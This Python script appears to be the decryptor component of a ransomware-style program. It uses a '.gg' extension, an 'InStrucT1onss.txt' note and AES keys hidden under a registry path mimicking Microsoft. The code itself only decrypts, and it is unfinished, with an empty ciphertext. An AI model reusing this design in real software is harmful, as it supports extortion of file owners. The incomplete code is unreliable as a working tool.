#!/bin/python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import winreg

# AES supports multiple key sizes: 16 (AES128), 24 (AES192), or 32 (AES256).
key_bytes = 32

EXT = ".gg"
INSTRUCT = "InStrucT1onss.txt"
ORIGINALPATH = "C:\Windows\Temp\OriginalPath.txt"
ENCPATH = "C:\Windows\Temp\EncPath.txt"
REG_PATH = "Software\Microsoft\Services"
KEY = "KeyValue"
IV = "IVvalue"

def get_reg(name):
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                       winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(registry_key, name)
        winreg.CloseKey(registry_key)
        return value
    except:
        return None

def decrypt(key, iv, ciphertext):
    assert len(key) == key_bytes

    # Initialize counter for decryption. iv should be the same as the output of
    # encrypt().
    iv_int = int(iv.encode('hex'), 16) 
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)

    # Create AES-CTR cipher.
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    # Decrypt and return the plaintext.
    plaintext = aes.decrypt(ciphertext)
    return plaintext

if __name__ == '__main__':
    key=get_reg(KEY)
    iv=get_reg(IV)
    line1 = []
    line2 = []
    with open(ENCPATH) as fp:
        line1 = fp.readlines()
        
    with open(ORIGINALPATH) as fp:
        line2 = fp.readlines()

    for line in line1:
        print(line)

    ciphertext=""
    print(decrypt(key, iv, ciphertext))